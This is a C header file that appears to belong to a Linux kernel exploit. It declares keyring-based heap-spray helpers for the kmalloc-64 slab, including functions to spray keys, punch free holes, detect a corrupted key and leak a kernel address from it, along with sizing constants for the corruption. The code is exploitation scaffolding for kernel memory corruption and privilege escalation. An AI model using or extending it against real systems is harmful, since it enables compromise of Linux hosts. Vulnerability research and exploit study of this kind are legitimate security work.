#pragma once

#include <stdint.h>
#include <sys/syscall.h>
#include <unistd.h>

// spray in kmalloc-64
#define KEY_PAYLOAD_SIZE (32 + 1 - 24)
#define PREFIX_BUF_LEN (16)
#define RCU_HEAD_LEN (16)
#define SPRAY_KEY_CNT (150)

#define FREE_HOLE_BEGIN (100)
#define FREE_HOLE_STEP (10)

#define CORRUPT_SIZE (0x8000)

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

void spray_keyring(key_serial_t *id_buffer, uint32_t spray_size);
uint64_t get_keyring_leak(key_serial_t id_buffer);
void release_key(key_serial_t id_buffer);
void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size);
int is_keyring_corrupted(key_serial_t *id_buffer, uint32_t id_buffer_size, key_serial_t *corrupted_key_id);